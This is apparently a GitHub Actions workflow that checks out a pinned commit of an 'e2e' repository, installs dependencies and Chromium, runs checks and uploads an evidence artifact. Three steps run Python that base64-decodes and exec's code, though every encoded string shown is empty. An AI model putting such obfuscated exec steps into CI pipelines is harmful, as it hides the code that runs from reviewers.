name: Private 1048 docs source fidelity
permissions:
  contents: read
jobs:
  docs:
    if: github.repository == 'rudycelekli/e2e'
    runs-on: ubuntu-24.04
    timeout-minutes: 35
    defaults:
      run:
        shell: bash --noprofile --norc -e -o pipefail {0}
    env:
      EVIDENCE: /tmp/e2e1048-proof
    steps:
    - uses: actions/checkout@3d3c42e5aac5ba805825da76410c181273ba90b1
      with:
        repository: rudycelekli/e2e
        ref: 6de152caff51a79311454a5367eb842d191ecba4
        persist-credentials: false
    - name: Freeze exact head and evidence
      run: python -c "import base64;exec(base64.b64decode(''))"
    - uses: pnpm/action-setup@9fd676a19091d4595eefd76e4bd31c97133911f1
      with:
        version: 12.3.4
    - uses: actions/setup-node@949feb2413d6458794dcd2491c4babbbce0c15c1
      with:
        node-version: 26
        cache: pnpm
    - run: pnpm install --frozen-lockfile 2>&1 | tee "$EVIDENCE/install.log"
    - run: pnpm --filter @e2e-dev/web exec playwright-core install chromium --with-deps
    - name: Apply exactly the source-copy docs delta
      id: candidate
      run: python -c "import base64;exec(base64.b64decode(''))"
    - name: Applicable repository check
      if: always() && steps.candidate.outcome == 'success'
      run: pnpm check 2>&1 | tee "$EVIDENCE/check.log"
    - name: Render corrected reference
      if: always() && steps.candidate.outcome == 'success'
      run: node "$EVIDENCE/render.mjs" candidate
    - name: Final exact source identity
      if: always() && steps.candidate.outcome == 'success'
      run: python -c "import base64;exec(base64.b64decode(''))"
    - uses: actions/upload-artifact@ea165f8d65b6e75b540449e92b4886f43607fa02
      if: always()
      with:
        name: e2e1048-docs-proof
        path: /tmp/e2e1048-proof
        include-hidden-files: true
        if-no-files-found: error
        retention-days: 14
'on':
  workflow_dispatch: null
